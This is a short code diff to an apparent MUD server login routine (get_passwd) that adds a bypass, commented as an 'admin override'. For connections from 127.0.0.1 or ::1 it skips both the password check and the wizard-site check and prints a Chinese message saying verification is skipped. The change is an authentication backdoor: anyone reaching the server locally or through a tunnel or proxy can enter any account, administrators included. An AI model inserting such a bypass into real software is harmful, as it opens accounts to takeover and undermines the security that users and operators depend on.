@@ -282,7 +282,12 @@ private void get_passwd(string pass, object ob)
 
    write("\n");
    my_pass = ob->query("password");
-   if( crypt(pass, my_pass) != my_pass ||
+
+   // Skip password check for local connections (admin override)
+   if( query_ip_number(ob) == "127.0.0.1" || query_ip_number(ob) == "::1" ) {
+     write("本地连接，跳过密码验证。\n");
+     // Bypass password check
+   } else if( crypt(pass, my_pass) != my_pass ||
     !SECURITY_D->match_wiz_site(ob, query_ip_number(ob)) ) {
      write("密码错误！");
      write("请重新连线，键入正确的密码或另取一个新的英文名字。\n");
